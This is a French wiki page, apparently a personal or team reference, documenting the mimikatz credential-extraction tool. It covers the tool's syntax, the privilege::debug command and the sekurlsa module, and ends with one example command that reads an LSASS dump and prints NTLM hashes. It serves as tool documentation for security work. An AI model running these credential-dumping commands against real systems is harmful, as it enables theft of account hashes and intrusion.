---
title: mimikatz
description: Permet d'extraire les mots de passe, hash, codes PIN ou tickets Kerberos depuis la mémoire. Peut aussi effectuer des attaques de type pass-the-hash, pass-the-ticket ou construire des Golden tickets.
published: true
date: 2024-07-16T17:18:40.317Z
tags: outil, windows
editor: markdown
dateCreated: 2024-07-14T13:18:23.544Z
---

# Introduction

**_Ce document est toujours en cours d'édition, en fonction des outils utilisés._**

Mimikatz permet d'extraire les mots de passe, hash, codes PIN ou tickets Kerberos depuis la mémoire. Peut aussi effectuer des attaques de type pass-the-hash, pass-the-ticket ou construire des Golden tickets.

> Mimikatz est disponible au téléchargement ici: https://github.com/gentilkiwi/mimikatz
> {.is-info}

# Syntaxe de lancement

`mimikatz.exe [instruction(s)]`

# Syntaxe d'instruction

`[nom du module]::[commande] [arguments]`

# Commandes du module standard

> Les commandes du module standard peuvent être exécutés sans préciser le module standard.
> {.is-info}

| Commande        | Description                                                      |
| --------------- | ---------------------------------------------------------------- |
| `exit`          | Quitte mimikatz                                                  |
| `cls`           | Efface l'affichage                                               |
| `log [fichier]` | Enregistre les entrées et sorties de mimikatz dans un fichier    |
| `base64`        | Permet d'utiliser l'encodage base64 toute sortie vers un fichier |
| `version`       | Affiche la version                                               |

# Modules

Les modules sont des boites à outils permettant des actions spécifiques.

| Module      | Description                                                                                                   |
| ----------- | ------------------------------------------------------------------------------------------------------------- |
| `privilege` | Permet de manipuler les privilèges du processus mimikatz                                                      |
| `sekurlsa`  | Permet d'extraire les mots de passe, hash, codes PIN ou tickets Kerberos depuis la mémoire du processus LSASS |

# Module privilege

| Module  | Description                                                      |
| ------- | ---------------------------------------------------------------- |
| `debug` | Demande le privilège SeDebugPrivilege pour le processus Mimikatz |

# Module sekurlsa

> Si aucun fichier de vidage n'est précisé, alors Mimikatz effectuera un vidage lui-même. Si cela est le cas, il faut obligatoirement avoir le privilège SeDebugPrivilege d'activé pour le processus (voir privilege::debug).
> {.is-info}

| Module                                        | Description                                                        |
| --------------------------------------------- | ------------------------------------------------------------------ |
| `minidump [fichier de vidage au format .dmp]` | Utilise le fichier de vidage du processus LSASS spécifié           |
| `logonpasswords`                              | Affiche les hashs NTLM des comptes ainsi que d'autres informations |

# Exemples

Utilise le fichier de vidage lsass.dmp et affiche les hashs NTML des comptes. Tout en sauvegardant la sortie vers le fichier "log1.log"

`mimikatz.exe "log log1.log" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"`

# A voir

Wiki de Mimikatz:
https://github.com/gentilkiwi/mimikatz/wiki
